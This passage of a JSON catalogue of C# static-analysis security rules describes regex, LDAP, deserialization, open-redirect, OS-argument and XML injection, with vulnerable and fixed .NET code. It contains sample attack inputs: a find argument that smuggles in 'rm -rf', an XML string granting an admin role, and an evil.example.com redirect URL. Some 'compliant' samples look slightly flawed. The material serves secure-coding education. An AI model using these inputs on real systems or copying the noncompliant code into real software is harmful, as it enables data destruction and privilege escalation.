        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior\nsanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    public IActionResult Validate(string regex, string input)\n    {\n        bool match = Regex.IsMatch(input, regex);\n\n        return Json(match);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    public IActionResult Validate(string regex, string input)\n    {\n        bool match = Regex.IsMatch(input, Regex.Escape(regex));\n\n        return Json(match);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the compliant solution example, <code>Regex.Escape</code> escapes metacharacters and escape sequences that could have broken the initially\nintended logic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">OWASP Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "roslyn.sonaranalyzer.security.cs:S2078": {
        "name": "LDAP queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it\nfirst.</p>\n<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must\nbe treated the same way as basic LDAP injections.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable\nfield to execute malicious LDAP commands.</p>\n<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data leakage or corruption</h4>\n<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data\nleakage or corruption.</p>\n<h4>Privilege escalation</h4>\n<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform\nauthorization checks or authentication.</p>\n<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated in an LDAP query without prior\nvalidation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    public IActionResult Authenticate(string user, string pass)\n    {\n        DirectoryEntry directory  = new DirectoryEntry(\"LDAP://ou=system\");\n        DirectorySearcher search  = new DirectorySearcher(directory);\n\n        search.Filter = \"(&amp;(uid=\" + user + \")(userPassword=\" + pass + \"))\";\n\n        return Json(search.FindOne() != null);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    public IActionResult Authenticate(string user, string pass)\n    {\n        // restrict the username and password to letters only\n        if (!Regex.IsMatch(user, \"^[a-zA-Z]+$\") || !Regex.IsMatch(pass, \"^[a-zA-Z]+$\"))\n        {\n            return BadRequest();\n        }\n\n        DirectoryEntry directory  = new DirectoryEntry(\"LDAP://ou=system\");\n        DirectorySearcher search  = new DirectorySearcher(directory);\n\n        search.Filter = \"(&amp;(uid=\" + user + \")(userPassword=\" + pass + \"))\";\n\n        return Json(search.FindOne() != null);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>\n<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>\n<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the\napplication to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>\n<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>\n<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>\\</code> </li>\n  <li> <code>#</code> </li>\n  <li> <code>+</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>,</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>\"</code> </li>\n  <li> <code>=</code> </li>\n</ul>\n<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>*</code> </li>\n  <li> <code>(</code> </li>\n  <li> <code>)</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>null</code> </li>\n</ul>\n<p>In the compliant solution example, a validation mechanism is applied to untrusted input to ensure it is strictly composed of alphabetic\ncharacters.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> <a href=\"https://www.ietf.org/rfc/rfc4514.txt\">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>\n  <li> <a href=\"https://www.ietf.org/rfc/rfc4515.txt\">RFC 4515</a> - LDAP: String Representation of Search Filters </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/90\">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S5135": {
        "name": "Deserialization should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a\ncarefully-crafted payload into the application.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s\nbehavior.</p>\n<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges\nor perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code\nexecution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate his privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Example : Controller\n{\n    [HttpPost]\n    public ActionResult Deserialize(HttpPostedFileBase inputFile)\n    {\n        ExpectedType expectedObject = null;\n        var formatter               = new BinaryFormatter();\n        expectedObject              = (ExpectedType)formatter.Deserialize(inputFile.InputStream);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Example : Controller\n{\n    [HttpPost]\n    public ActionResult Deserialize(HttpPostedFileBase inputFile)\n    {\n        ExpectedType expectedObject = null;\n        JsonSerializer serializer   = new JsonSerializer(typeof(expectedObject));\n        expectedObject              = (ExpectedType)serializer.Deserialize(inputFile.InputStream);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>\n<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to\navoid deserialization in the first place.</p>\n<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>\n<h4>More secure serialization methods</h4>\n<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>\n<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>\nIn this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>\n<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most\ncommon method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the\nProtobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>\n<h4>Integrity check</h4>\n<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application\nserver:</p>\n<ul>\n  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>\n  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>\n</ul>\n<p>Depending on the situation, two MAC computation modes can be used.</p>\n<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC\nshould be preferred, with a strong underlying hash algorithm such as SHA-256.</p>\n<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a\nsigning secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>\n<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>\n<h4>Pre-Approved classes</h4>\n<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does\nnot match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language\nor framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>\n<p>In the code samples, a pre-approved class is used natively by JsonSerializer to validate the class during serialization. XmlSerializer also\nprovides this capability.<br> <strong>Note</strong>: The pre-approved class should not tamper with the application’s inner workings.</p>\n<p>The following native types are considered unsafe because they do not provide these capabilities:</p>\n<ul>\n  <li> <code>BinaryFormatter</code> </li>\n  <li> <code>SoapFormatter</code> </li>\n  <li> <code>NetDataContractSerializer</code> </li>\n  <li> <code>LosFormatter</code> </li>\n  <li> <code>ObjectStateFormatter</code> </li>\n</ul>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S5146": {
        "name": "HTTP request redirections should not be open to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in ASP.NET</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController : Controller\n{\n    [HttpGet]\n    public void Redirect(string url)\n    {\n        Response.Redirect(url);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController : Controller\n{\n    private readonly string[] allowedUrls = { \"/\", \"/login\", \"/logout\" };\n\n    [HttpGet]\n    public void Redirect(string url)\n    {\n        if (allowedUrls.Contains(url))\n        {\n            Response.Redirect(url);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like\nexisting domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S5883": {
        "name": "OS commands should not be vulnerable to argument injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data\nis limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the\nbehavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The\nsecurity of the application depends on the behavior of the application that is executed.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the\ncommand the parameters are added to, this might lead to arbitrary command execution.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to arguments injection because untrusted data is inserted directly into the arguments of a process call without sanitization.<br>\nThe application assumes that incoming data always consists of a specific range of characters and ignores that some characters might force the\n<code>find</code> command to start a shell.</p>\n<p>In this particular case, an attacker may remove files in <code>/some/folder</code> with the following string:</p>\n<pre>\n'*' -exec rm -rf {} \\;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    public void Run(string args)\n    {\n        Process p             = new Process();\n        p.StartInfo.FileName  = \"/usr/bin/find\";\n        p.StartInfo.Arguments = \"/some/folder -iname \" + args;\n        p.Start();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    public void Run(string args)\n    {\n        Process p            = new Process();\n        p.StartInfo.FileName = \"/usr/bin/find\";\n        p.StartInfo.ArgumentList.Add(\"/some/folder\");\n        p.StartInfo.ArgumentList.Add(\"-iname\");\n        p.StartInfo.ArgumentList.Add(args);\n        p.Start();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>Here <code>ArgumentList</code> takes care of escaping the passed arguments and internally creates a single string given to the operating system\nwhen <code>System.Diagnostics.Process.Start()</code> is called.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "roslyn.sonaranalyzer.security.cs:S6399": {
        "name": "XML operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>XML injections occur when an application builds an XML-formatted string from user input without prior validation or sanitation. In such a case, a\ntainted user-controlled value can tamper with the XML string content. Especially, unexpected arbitrary elements and attributes can be inserted in the\ncorresponding XML description.</p>\n<p>A malicious injection payload could, for example:</p>\n<ul>\n  <li> Insert tags into the main XML document. </li>\n  <li> Add attributes to an existing XML tag. </li>\n  <li> Change the data value inside a tag. </li>\n</ul>\n<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences of an XML injection attack on an application vary greatly depending on the application’s logic. It can affect the application\nitself or another element if the XML document is used for cross-component data exchange. For this reason, the actual impact can range from benign\ninformation disclosure to critical remote code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can forge an attack payload that will modify the XML document so that it will become syntactically incorrect. In that case, when the\ndata is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this\ntechnical error may disclose sensitive business or technical information.</p>\n<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>\n<h4>Internal requests tampering</h4>\n<p>Some applications communicate with backend micro-services APIs using XML-based protocols such as SOAP. When those applications are vulnerable to\nXML injections, attackers can tamper with the internal requests' content. This will allow them to change internal requests' parameters or locations\nwhich, in turn, can lead to various consequences like performing unauthorized actions or accessing sensitive data.</p>\n<p>For example, altering a user creation request in such a way can lead to a privilege escalation if attackers manage to modify the default account\nprivilege level.</p>\n<h4>Code execution</h4>\n<p>An application might build objects based on an XML serialization string. In that case, an attacker that would exploit an XML injection could be\nable to alter the serialization string to modify the corresponding object’s properties.</p>\n<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can\nlead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function: The role of a user is set in an XML file and the default user role is\n<code>user</code>.<br> This example code is vulnerable to an XML injection vulnerability because it builds an XML string from user input without prior\nsanitation or validation.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nattacker&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;\n&lt;user&gt;&lt;username&gt;foo\n</pre>\n<p>By adapting and inserting this string into the <code>username</code> field, an attacker would be able to log in as an admin.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Xml;\n\npublic class ExampleController : Controller\n{\n    public async void Example(string username)\n    {\n        XmlWriter writer = XmlWriter.Create(\"data.xml\");\n        await writer.WriteRawAsync(\n            $@\"&lt;user&gt;\n                &lt;username&gt;{username}&lt;/username&gt; &lt;!-- Noncompliant --&gt;\n                &lt;role&gt;user&lt;/role&gt;\n            &lt;/user&gt;\"\n        );\n        await writer.DisposeAsync();\n    }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nusing System.Xml;\n\npublic class ExampleController : Controller\n{\n    public async void Example(string username)\n    {\n        XmlDocument doc = new XmlDocument();\n        XmlElement user = doc.CreateElement(\"user\");\n        doc.AppendChild(user);\n\n        user.InnerXml = $@\"\n            &lt;username&gt;{username}&lt;/username&gt; &lt;!-- Noncompliant --&gt;\n            &lt;role&gt;user&lt;/role&gt;\";\n        doc.Save(\"data.xml\");\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Xml;\nusing System.Security;\n\npublic class ExampleController : Controller\n{\n    public async void Example(string username)\n    {\n        XmlWriter writer = XmlWriter.Create(\"data.xml\");\n        await writer.WriteRawAsync(\n            $@\"&lt;user&gt;\n                &lt;username&gt;{SecurityElement.Escape(username)}&lt;/username&gt;\n                &lt;role&gt;user&lt;/role&gt;\n            &lt;/user&gt;\"\n        );\n        await writer.DisposeAsync();\n    }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nusing System.Xml;\n\npublic class ExampleController : Controller\n{\n    public async void Example(string username)\n    {\n        XmlDocument doc = new XmlDocument();\n        XmlElement user = doc.CreateElement(\"user\");\n        doc.AppendChild(user);\n\n        XmlElement username_element = d.CreateElement(\"username\");\n        user.AppendChild(username_element);\n        username_element.InnerText = username;\n\n        XmlElement role = d.CreateElement(\"role\");\n        user.AppendChild(role);\n        role.InnerText = \"user\";\n        doc.Save(\"data.xml\");\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, building XML strings with a direct concatenation of user input is discouraged. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create documents from user input without having to build and parse an XML string. Doing so prevents\ninjection vulnerabilities as XML document construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in a document built from a trusted XML string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting document.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, casting user-submitted data to a harmless type can help prevent XML injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - 